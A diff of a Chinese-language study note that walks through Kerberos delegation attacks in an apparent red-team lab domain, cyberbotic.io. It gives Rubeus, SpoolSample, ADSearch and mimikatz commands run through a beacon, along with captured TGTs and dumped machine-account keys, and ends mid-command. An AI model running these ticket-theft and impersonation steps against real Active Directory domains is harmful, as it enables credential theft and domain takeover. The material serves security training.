@@ -202,41 +202,48 @@ execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe monitor /targetuser
 ```
 [+] received output:
 
-[*] 8/11/2022 12:56:40 AM UTC - Found new TGT:
+[*] 8/13/2022 12:05:37 AM UTC - Found new TGT:
 
   User                  :  nlamb@DEV.CYBERBOTIC.IO
-  StartTime             :  8/11/2022 12:56:35 AM
-  EndTime               :  8/11/2022 10:56:35 AM
+  StartTime             :  8/13/2022 12:05:35 AM
+  EndTime               :  8/13/2022 10:05:35 AM
   RenewTill             :  1/1/1970 12:00:00 AM
   Flags                 :  name_canonicalize, pre_authent, forwarded, forwardable
   Base64EncodedTicket   :
 
     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
-    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
+    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
 
+[*] Ticket cache size: 1
+
+
+
+
 ```
+
+doIFZzCCBWOgAwIBBaEDAgEWooIEYDCCBFxhggRYMIIEVKADAgEFoRMbEURFVi5DWUJFUkJPVElDLklPoiYwJKADAgECoR0wGxsGa3JidGd0GxFERVYuQ1lCRVJCT1RJQy5JT6OCBA4wggQKoAMCARKhAwIBAqKCA/wEggP46cUuZcjwVYCnrsfz/+ND3pPTeURup/ID/eK56bLSGFYat3pt8llgbkjI+JTE5bG2EPi+1+vhNZSluxWKsdmehHvvyecOLwCpiLAtS7jj0wntk/SMgOjhgps6fNmbxAdtnjo9WxWHSIYONIblOrEqzLky9dFVFO9zlxlKZt+paK9YElEtb+Gtb+coplTWxV0fM9Uh8REFDQlKpPv7kdYEA+BhyTnsDq2a92VgJ2BHSnq+Nqu5iUBuVrRva25P5mcEbOqZhc44+GnHigkgk9VulSi4JV5tYgUapj5nmYv2cJyYqxY6PoL/2JOMozK+qNXIpClB2w7JaJtsqnshN7kcRm3pGq5UVu2BLSvM0OywYzw4neU55j5jK8dtfRGb44gTEWmdlktD7NpWcEzrCHHBDl7yUSWp9eUgzlUjHzAIAlLN16FVtdHJs81KOCt8cGIWvG4GzjQiZ8Bw/hMqPxDd+ccdeIuPooydEyJNZ6A8afmuHObDif/c/mHZ9zaQOpH8y2w56wRsIWHB+71B96wRdH3w/2SttBd3if8YdhDIV+a2JeJwu58lkdxrPllRD5fCx8nssaFD1+f160Iui7RN8sDK3bfL4IucOzZHkvC024NNNu139K7ShexLfelaQO6n8NT2y/vtjQEFpjdvXXypo+Q5R3cb5xA+PIu5VFtU5AWe2ZQrde7TYwhDlV+e5e4wqIL7s+HFZFBrOWh+NHFLqPmwbx/8TQytnZAhcPZLp6HdhNh5plP+o9HZapOXd6x5jexQI7BxqGo0m/lU0vuAHqoKcyJHV4MGPUTuY3Byw+37yYnLaR4W6jvvzRl+jMielLE3I852D3SFXOGuAJRdf+ZhrrVrY6Eeb8bKfImsLp9CvbxGEsAvs9K5kcWIWJ3sPC880o7DZlVJP6jIkOSVIWrnKUaxB+7PvVbcGoNkVsi23MHCUPPArF3Im9jxWagODSQHmhzYiKkghHJIHZUX4KymnmnEjebClwcQvtol570LS/cvGqtEStvCQLH30kXI+bXtiBPxZUTYRnztDyMwBTUqhSELZbrvGA/SViJrOMZO24vUc7VpMwArVRDlubq1VBNuZNpSCuHXoQ9Dz0X65lCETjpyKSxGPh4cPiwY/xDljqEZnG6COOSj6iSHAR1w8eDw1ziMUYGIf0uNHsJBhHRiZYaL8FbL/0rPvVKWPSuJk69smoSMn22bLNf05aP15RbyGiC3nymUCHRXhT3b+APKxsFHl8h/DbVlEvPWFmI6hGIO7I3/4VJkXUkI+0VebmRk9BfVF/T+U1lHr9iy0DGjocsAzOhL23Y8JCV839tNmM6DFTY5jGu5lOOwl5J/fiE4yFGcp7CjgfIwge+gAwIBAKKB5wSB5H2B4TCB3qCB2zCB2DCB1aArMCmgAwIBEqEiBCDp028cyVAizDtOxteLI/smZyuj14wvAn5HtIjziiQwh6ETGxFERVYuQ1lCRVJCT1RJQy5JT6ISMBCgAwIBAaEJMAcbBW5sYW1iowcDBQBgIQAApREYDzIwMjIwODEzMDAwNTM1WqYRGA8yMDIyMDgxMzEwMDUzNVqnERgPMTk3MDAxMDEwMDAwMDBaqBMbEURFVi5DWUJFUkJPVElDLklPqSYwJKADAgECoR0wGxsGa3JidGd0GxFERVYuQ1lCRVJCT1RJQy5JTw==
 
 
 用powershell根据tgt制作ticket
 ```
-[IO.File]::WriteAllBytes("C:\Users\bfmarer\Desktop\ticket.kirbi", [Convert]::FromBase64String("doIFZzCCBWOgAwIBBaEDAgEWooIEYDCCBFxhggRYMIIEVKADAgEFoRMbEURFVi5DWUJFUkJPVElDLklPoiYwJKADAgECoR0wGxsGa3JidGd0GxFERVYuQ1lCRVJCT1RJQy5JT6OCBA4wggQKoAMCARKhAwIBAqKCA/wEggP4I+aflzp17pqiJHYT0JvaIHyDcHcGZYIOnFlOkkUydDuRhAyepxh1aMadlIxZdtpj6vxgzcjN/qsMOZuCz+QmrWdVRTVoXH/e+XeiyOBTyLFMgMbI7uWx2/OveVs2ym0bHQEQDxBcJDeN+vSi56o71wDBIBeljX2Hw6j6I6URkp9LJNK2VkozNk39oFFrbvT2bRInORkdOtPC35eoY9/wY+3snYkqOJQ2IXgk2PptWZ42pvzM7+yqeXRq2VNAYJDp2TBLWcgRcTghG0xIqQBOkDv/qO7NACib8++wtjpBpVW5YPNuKTpIAF011NCQRRDHWoNvspIp6Z8efNMgix6JJhHWezM/cpVuu9lNLXl1miVqstcY6gmpCvqLMPaopjkSni7subR3IXuB/jsa5eNt0b3CvXjZ/Y0KqfR+BXvADW1XDv2eEZqFl6CLCnDvElaKhY9CIlkv6RYb4TGxcpxHTdQPVncd1Y+ILOZDWaG+kXv/PBHIe+fOD8hK3l4o+Jk62HbvO98jB9TUZtTeH7jXSdixzymsyW5QTPpZ6+JfvEn6MVDLeSn8oOGre0bPm8NezQpyHjCv57fTaeIBxwJ/XAtn/i0MzXxD/3Vvajsr3kuWCRIPCII+L47sFbbjZt0LkAGizakNZY9sDCmlzOngB4VKiLXwbjJXyotiafyFzLpdiCgyXMG8qV8H1g2PQ8nXMVDAHpTa1fctY8NP8Tlzmit4z4MhdCn7XS0UvUp6qdm8hJxE0NU+NIF4G4xQ1yENjvXzFqs5NCKLJCo8WyFYCX5rQdfBZq3JpCQb8e5eh5oKgkxiJ5Rra4wAZm483DgAIq28ATQj3xttCON+iwGaG1Tf8y6WGGHBqXYhwPM7+1Ls/CCxUiZTpEYWQX8jcT+DPF6Ji8EfASLYRT/xmf/F+x21RsV1k7oAWcbdatrp9TIUSGANhYj0kJ6YUuWC+yfLi3OILoWUQVxL8BYSLLR2zAakr64hfUtuXD82qzvWLabA0oYzA8FuyyhBIjY1sCqis5rfeJ4sV2fCP/6iBFbMmZqfiazt7Vx6K2DUd3I8r5yJQCb4tnby4DevoHXp+xnczIYv4Pf4M72voWm08ocYDIedkBtnWlrZlw3/ZG7Z1NGzUZVLFdXL5u4V/gVbgtyp9ZuDuVBBzYgLJ1zdMBWnbXJi+VEG9g2nOWD2ySZSRloshQsUvIv17vQlaWqSe3OB7DNy+X9dotKf85xsGwg1hFALWMTpyyUIeslOJTXhCdL0npdtBhCJffzQ7S3F4agYC4L0W0lJly21Ec+kR8HL4JpPhDboaS4Ry6F65eGT+OWiuyB7YF1MSbJ6FAJ7EX2EpqgwZPdL4TSjgfIwge+gAwIBAKKB5wSB5H2B4TCB3qCB2zCB2DCB1aArMCmgAwIBEqEiBCD8y3kIIE1V18wD3aQdrhINPU/88IwqEpSTqFuYlI+ea6ETGxFERVYuQ1lCRVJCT1RJQy5JT6ISMBCgAwIBAaEJMAcbBW5sYW1iowcDBQBgIQAApREYDzIwMjIwODExMDA1NjM1WqYRGA8yMDIyMDgxMTEwNTYzNVqnERgPMTk3MDAxMDEwMDAwMDBaqBMbEURFVi5DWUJFUkJPVElDLklPqSYwJKADAgECoR0wGxsGa3JidGd0GxFERVYuQ1lCRVJCT1RJQy5JTw=="))
+[IO.File]::WriteAllBytes("C:\Users\Administrator\desktop\nlamb.kirbi", [Convert]::FromBase64String("doIFZzCCBWOgAwIBBaEDAgEWooIEYDCCBFxhggRYMIIEVKADAgEFoRMbEURFVi5DWUJFUkJPVElDLklPoiYwJKADAgECoR0wGxsGa3JidGd0GxFERVYuQ1lCRVJCT1RJQy5JT6OCBA4wggQKoAMCARKhAwIBAqKCA/wEggP46cUuZcjwVYCnrsfz/+ND3pPTeURup/ID/eK56bLSGFYat3pt8llgbkjI+JTE5bG2EPi+1+vhNZSluxWKsdmehHvvyecOLwCpiLAtS7jj0wntk/SMgOjhgps6fNmbxAdtnjo9WxWHSIYONIblOrEqzLky9dFVFO9zlxlKZt+paK9YElEtb+Gtb+coplTWxV0fM9Uh8REFDQlKpPv7kdYEA+BhyTnsDq2a92VgJ2BHSnq+Nqu5iUBuVrRva25P5mcEbOqZhc44+GnHigkgk9VulSi4JV5tYgUapj5nmYv2cJyYqxY6PoL/2JOMozK+qNXIpClB2w7JaJtsqnshN7kcRm3pGq5UVu2BLSvM0OywYzw4neU55j5jK8dtfRGb44gTEWmdlktD7NpWcEzrCHHBDl7yUSWp9eUgzlUjHzAIAlLN16FVtdHJs81KOCt8cGIWvG4GzjQiZ8Bw/hMqPxDd+ccdeIuPooydEyJNZ6A8afmuHObDif/c/mHZ9zaQOpH8y2w56wRsIWHB+71B96wRdH3w/2SttBd3if8YdhDIV+a2JeJwu58lkdxrPllRD5fCx8nssaFD1+f160Iui7RN8sDK3bfL4IucOzZHkvC024NNNu139K7ShexLfelaQO6n8NT2y/vtjQEFpjdvXXypo+Q5R3cb5xA+PIu5VFtU5AWe2ZQrde7TYwhDlV+e5e4wqIL7s+HFZFBrOWh+NHFLqPmwbx/8TQytnZAhcPZLp6HdhNh5plP+o9HZapOXd6x5jexQI7BxqGo0m/lU0vuAHqoKcyJHV4MGPUTuY3Byw+37yYnLaR4W6jvvzRl+jMielLE3I852D3SFXOGuAJRdf+ZhrrVrY6Eeb8bKfImsLp9CvbxGEsAvs9K5kcWIWJ3sPC880o7DZlVJP6jIkOSVIWrnKUaxB+7PvVbcGoNkVsi23MHCUPPArF3Im9jxWagODSQHmhzYiKkghHJIHZUX4KymnmnEjebClwcQvtol570LS/cvGqtEStvCQLH30kXI+bXtiBPxZUTYRnztDyMwBTUqhSELZbrvGA/SViJrOMZO24vUc7VpMwArVRDlubq1VBNuZNpSCuHXoQ9Dz0X65lCETjpyKSxGPh4cPiwY/xDljqEZnG6COOSj6iSHAR1w8eDw1ziMUYGIf0uNHsJBhHRiZYaL8FbL/0rPvVKWPSuJk69smoSMn22bLNf05aP15RbyGiC3nymUCHRXhT3b+APKxsFHl8h/DbVlEvPWFmI6hGIO7I3/4VJkXUkI+0VebmRk9BfVF/T+U1lHr9iy0DGjocsAzOhL23Y8JCV839tNmM6DFTY5jGu5lOOwl5J/fiE4yFGcp7CjgfIwge+gAwIBAKKB5wSB5H2B4TCB3qCB2zCB2DCB1aArMCmgAwIBEqEiBCDp028cyVAizDtOxteLI/smZyuj14wvAn5HtIjziiQwh6ETGxFERVYuQ1lCRVJCT1RJQy5JT6ISMBCgAwIBAaEJMAcbBW5sYW1iowcDBQBgIQAApREYDzIwMjIwODEzMDAwNTM1WqYRGA8yMDIyMDgxMzEwMDUzNVqnERgPMTk3MDAxMDEwMDAwMDBaqBMbEURFVi5DWUJFUkJPVElDLklPqSYwJKADAgECoR0wGxsGa3JidGd0GxFERVYuQ1lCRVJCT1RJQy5JTw=="))
 ```
 
 
@@ -261,4 +268,285 @@ beacon> jobkill 1
 
 ![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660179755965.png)
 
-5. 
+5. 转存ticket
+
+1660349494829.png
+
+6. 使用上面生成的ticket
+
+1660349572197.png
+
+
+# The "Printer Bug"
+
+也是无约束委派的利用
+
+1. 在srv-1开启监听
+```
+execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe monitor /targetuser:DC-2$ /interval:10 /nowrap
+```
+1660349812805.png
+
+2. 在WKSTN-1强制dc-2向srv-1进行身份验证
+
+```
+execute-assembly C:\Tools\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe dc-2 srv-1
+```
+
+1660349927216.png
+
+3. 捕获到DC2的ticket
+
+1660349990632.png
+
+4. 制作成dc2的ticket
+
+1660350175707.png
+
+5. 导入ticket
+
+1660350337962.png
+
+# Constrained Delegation
+
+枚举约束委派
+```
+execute-assembly C:\Tools\ADSearch\ADSearch\bin\Debug\ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json
+```
+
+显示
+```
+beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Debug\ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json
+[*] Tasked beacon to run .NET program: ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json
+[+] host called home, sent: 483667 bytes
+[+] received output:
+
+    ___    ____  _____                 __  
+   /   |  / __ \/ ___/___  ____ ______/ /_ 
+  / /| | / / / /\__ \/ _ \/ __ `/ ___/ __ \
+ / ___ |/ /_/ /___/ /  __/ /_/ / /__/ / / /
+/_/  |_/_____//____/\___/\__,_/\___/_/ /_/ 
+                                           
+Twitter: @tomcarver_
+GitHub: @tomcarver16
+            
+[*] No domain supplied. This PC's domain will be used instead
+[*] LDAP://DC=dev,DC=cyberbotic,DC=io
+[*] CUSTOM SEARCH: 
+
+[+] received output:
+[*] TOTAL NUMBER OF SEARCH RESULTS: 1
+
+[+] received output:
+[
+  {
+    "cn": "SRV-2",
+    "dnshostname": "srv-2.dev.cyberbotic.io",
+    "samaccountname": "SRV-2$",
+    "msds-allowedtodelegateto": [
+      "eventlog/dc-2.dev.cyberbotic.io/dev.cyberbotic.io",
+      "eventlog/dc-2.dev.cyberbotic.io",
+      "eventlog/DC-2",
+      "eventlog/dc-2.dev.cyberbotic.io/DEV",
+      "eventlog/DC-2/DEV",
+      "cifs/wkstn-2.dev.cyberbotic.io",
+      "cifs/WKSTN-2"
+    ]
+  }
+]
+
+```
+
+1660350554524.png
+
+从枚举结果可知，srv-2委派了
+
+wkstn-2上的cifs服务
+
+dc-2上的eventlog服务
+
+## 方法一
+查看机器里面的tgt
+```
+execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe triage
+```
+
+显示
+```
+beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe triage
+[*] Tasked beacon to run .NET program: Rubeus.exe triage
+[+] host called home, sent: 585271 bytes
+[+] received output:
+
+   ______        _                      
+  (_____ \      | |                     
+   _____) )_   _| |__  _____ _   _  ___ 
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.1.1 
+
+
+Action: Triage Kerberos Tickets (All Users)
+
+[*] Current LUID    : 0x3e7
+
+ ---------------------------------------------------------------------------------------------------------------- 
+ | LUID    | UserName                   | Service                                       | EndTime               |
+ ---------------------------------------------------------------------------------------------------------------- 
+ | 0x3e4   | srv-2$ @ DEV.CYBERBOTIC.IO | krbtgt/DEV.CYBERBOTIC.IO                      | 8/13/2022 9:59:32 AM  |
+
+...
+
+```
+
+
+1660351272613.png
+
+
+## 方法二
+
+或者使用mimimkatz导出srv-2的tgt
+
+导出哈希
+```
+mimikatz sekurlsa::ekeys
+beacon> mimikatz sekurlsa::ekeys
+[*] Tasked beacon to run mimikatz's sekurlsa::ekeys command
+[+] host called home, sent: 788093 bytes
+[+] received output:
+
+Authentication Id : 0 ; 996 (00000000:000003e4)
+Session           : Service from 0
+User Name         : SRV-2$
+Domain            : DEV
+Logon Server      : (null)
+Logon Time        : 8/12/2022 11:56:25 PM
+SID               : S-1-5-20
+
+	 * Username : srv-2$
+	 * Domain   : DEV.CYBERBOTIC.IO
+	 * Password : (null)
+	 * Key List :
+	   aes256_hmac       6e2aa9430552f43c26e3d534d49776f7a53ca938dff193b877ba7502bdaf1750
+	   rc4_hmac_nt       f797a8372d1e7a821e49f61efca73e23
+	   rc4_hmac_old      f797a8372d1e7a821e49f61efca73e23
+	   rc4_md4           f797a8372d1e7a821e49f61efca73e23
+	   rc4_hmac_nt_exp   f797a8372d1e7a821e49f61efca73e23
+	   rc4_hmac_old_exp  f797a8372d1e7a821e49f61efca73e23
+
+
+```
+
+利用哈希导出tgt
+```
+execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe asktgt /user:srv-2$ /aes256:6e2aa9430552f43c26e3d534d49776f7a53ca938dff193b877ba7502bdaf1750 /opsec /nowrap
+```
+
+
+根据base64制作tgt
+
+```
+[IO.File]::WriteAllBytes("C:\Users\Administrator\desktop\srv-2.kirbi", [Convert]::FromBase64String("doIFLDCCBSigAwIBBaEDAgEWooIEJDCCBCBhggQcMIIEGKADAgEFoRMbEURFVi5DWUJFUkJPVElDLklPoiYwJKADAgECoR0wGxsGa3JidGd0GxFERVYuQ1lCRVJCT1RJQy5JT6OCA9IwggPOoAMCARKhAwIBAqKCA8AEggO8fOhVlAS/zEnZTsYjnXPdDMy0KpsClN+FYLxvzJf0Q5BTvFsP7s4ydsq8Irv90yGukYz+LkKueGx6wOlWPoXt0ukG/uVmhMjJMI96W92nQd2QRVoN2Fquzo7L8PU5MT0HkglN2ZwjYlUK2IkYQ++lShBEBZFiYM8lmvUSd3F/thF3b2DBPSRQ0LOkuiU0XydekDDdkycYneAjWnNpOtE6QkfWR/GTwis/Sz35tEZufcSM9UuXdd4GPy0eIkUpPXb08s88HXsRmTK17n3d738VIGKRjwV97FuR7R56S5N5CQvyfjpUbzf0nX3AgO7522Jv+Wz9DV1ruXpthXGf6iXHVkHunKptD7DTFwdrWkOGNIogOkDjqHF7Ejc4Rs0ozsZealvM52nC2EHuwQhQ2YrfbZXV46TXs+Vh4S+pBAUvVYoEuIGDBucUmfyAXHTyoXmZf8MTUAvKdYDm7NwSAv7ZcWe7R1b63/i9njxOQWhSQdVTi/FbtUZybTvnHYotp87Mraswuw0kL1/8Df/BI6QDkKiVosakW7om8y7gtihxHfPHVqxnn/qmtfbsPXBjpUcGC/hJVcwctQXNSd3uZHry0FrJ2uZszixg9isXSDiKNjs21u6EVl448MF1yig0yzhwVFZztzmzFR5e3AJF6DYAe82sjfFrLaveqcSWGMvQK3sZ7GwYnC9Mzv9TmOMAfuaHuolDfGEFluYn0b0G/3mVxirYJYwwD0jgrqCpf6qtJ/IbIRBRceNR4tkc3myptC52ip4jfb+O+TlgQtgkxerEu3RX+DQbzrGSz58QfEr3eqCtqXspcztpKZWQ+Z6ot4ae/0MgKRLicuiQX74boET6pXoJaqLjURJnwfy4p5gNAvx9PfexchfaQcmzelqShuLiiPSakVcWh7NwNzaLWszEr57QO74wdBASwRyHFrNHKUY4RGn6dFuQwxacUCgd0XxFnaUDRblE4gtlrGJ459/XQOPOCJnY501oGKnm6tEpAB8Bne3IQU0nBmfmXh1lKLJ9OD5OkiKZyzqP1KAO9vG919XS/EgaDpvBGD7GINergqn8wsWjyeUg+lAJXtJDmMIAIKbJZ1q1J//i6H8KE1x5cixFC3oUip7tj9h/4Rc1NecP6CH2/y7qaqIi+EKVe0kvBA2DSCtQyBhMfdSAWHwDulpOMsZpj5SDouqosU5rYY3ffJ6v7dHEOZoep4OGI0AXGhU02cIiaDeTFCzvvlMHzGLRV7WLIR24GzciJoxRu3/k3GeylYgHZ2I+NpWjgfMwgfCgAwIBAKKB6ASB5X2B4jCB36CB3DCB2TCB1qArMCmgAwIBEqEiBCDuzf+ZtnnNVrd9s1eEG3GhG87pMy3KdLrw3aRaEyYHjqETGxFERVYuQ1lCRVJCT1RJQy5JT6ITMBGgAwIBAaEKMAgbBlNSVi0yJKMHAwUAQOEAAKURGA8yMDIyMDgxMzAwNDg1N1qmERgPMjAyMjA4MTMxMDQ4NTdapxEYDzIwMjIwODIwMDA0ODU3WqgTGxFERVYuQ1lCRVJCT1RJQy5JT6kmMCSgAwIBAqEdMBsbBmtyYnRndBsRREVWLkNZQkVSQk9USUMuSU8="))
+```
+
+
+根据tgt，生成访问cifs的tgs
+
+```
+execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe s4u /impersonateuser:nlamb /msdsspn:cifs/wkstn-2.dev.cyberbotic.io /user:srv-2$ /ticket:doIFLDCCBSigAwIBBaEDAgEWooIEJDCCBCBhggQcMIIEGKADAgEFoRMbEURFVi5DWUJFUkJPVElDLklPoiYwJKADAgECoR0wGxsGa3JidGd0GxFERVYuQ1lCRVJCT1RJQy5JT6OCA9IwggPOoAMCARKhAwIBAqKCA8AEggO8fOhVlAS/zEnZTsYjnXPdDMy0KpsClN+FYLxvzJf0Q5BTvFsP7s4ydsq8Irv90yGukYz+LkKueGx6wOlWPoXt0ukG/uVmhMjJMI96W92nQd2QRVoN2Fquzo7L8PU5MT0HkglN2ZwjYlUK2IkYQ++lShBEBZFiYM8lmvUSd3F/thF3b2DBPSRQ0LOkuiU0XydekDDdkycYneAjWnNpOtE6QkfWR/GTwis/Sz35tEZufcSM9UuXdd4GPy0eIkUpPXb08s88HXsRmTK17n3d738VIGKRjwV97FuR7R56S5N5CQvyfjpUbzf0nX3AgO7522Jv+Wz9DV1ruXpthXGf6iXHVkHunKptD7DTFwdrWkOGNIogOkDjqHF7Ejc4Rs0ozsZealvM52nC2EHuwQhQ2YrfbZXV46TXs+Vh4S+pBAUvVYoEuIGDBucUmfyAXHTyoXmZf8MTUAvKdYDm7NwSAv7ZcWe7R1b63/i9njxOQWhSQdVTi/FbtUZybTvnHYotp87Mraswuw0kL1/8Df/BI6QDkKiVosakW7om8y7gtihxHfPHVqxnn/qmtfbsPXBjpUcGC/hJVcwctQXNSd3uZHry0FrJ2uZszixg9isXSDiKNjs21u6EVl448MF1yig0yzhwVFZztzmzFR5e3AJF6DYAe82sjfFrLaveqcSWGMvQK3sZ7GwYnC9Mzv9TmOMAfuaHuolDfGEFluYn0b0G/3mVxirYJYwwD0jgrqCpf6qtJ/IbIRBRceNR4tkc3myptC52ip4jfb+O+TlgQtgkxerEu3RX+DQbzrGSz58QfEr3eqCtqXspcztpKZWQ+Z6ot4ae/0MgKRLicuiQX74boET6pXoJaqLjURJnwfy4p5gNAvx9PfexchfaQcmzelqShuLiiPSakVcWh7NwNzaLWszEr57QO74wdBASwRyHFrNHKUY4RGn6dFuQwxacUCgd0XxFnaUDRblE4gtlrGJ459/XQOPOCJnY501oGKnm6tEpAB8Bne3IQU0nBmfmXh1lKLJ9OD5OkiKZyzqP1KAO9vG919XS/EgaDpvBGD7GINergqn8wsWjyeUg+lAJXtJDmMIAIKbJZ1q1J//i6H8KE1x5cixFC3oUip7tj9h/4Rc1NecP6CH2/y7qaqIi+EKV